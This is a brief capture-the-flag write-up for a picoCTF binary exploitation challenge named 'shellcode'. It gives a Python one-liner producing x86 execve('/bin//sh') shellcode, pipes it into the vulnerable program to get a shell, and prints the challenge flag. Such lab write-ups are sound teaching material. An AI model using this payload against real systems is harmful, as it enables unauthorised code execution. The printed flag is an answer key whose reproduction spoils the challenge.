# shellcode
Binary Exploitation - 200 points

## Challenge 
> This [program](vuln) executes any input you give it. Can you get a shell? You can find the program in /problems/shellcode_3_09e0c5074980877d900d65c545d1e127 on the shell server. 

[Source.](vuln.c)


## Solution

The right shellcode must be used.

These few seem to work for me:

- http://shell-storm.org/shellcode/files/shellcode-827.php
- http://shell-storm.org/shellcode/files/shellcode-575.php

Referring to [@LFlare's writeup from PicoCTF 2017](https://github.com/LFlare/picoctf_2017_writeup/tree/master/binary/shellz)


	$ python -c "print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')" > ~/payload
	
	$ cat ~/payload - | ./vuln 
	Enter a string!
	j
	 X?Rh//shh/bin??1?̀
	Thanks! Executing now...
	ls
	flag.txt  vuln	vuln.c
	cat flag.txt
	picoCTF{shellc0de_w00h00_7f5a7309}
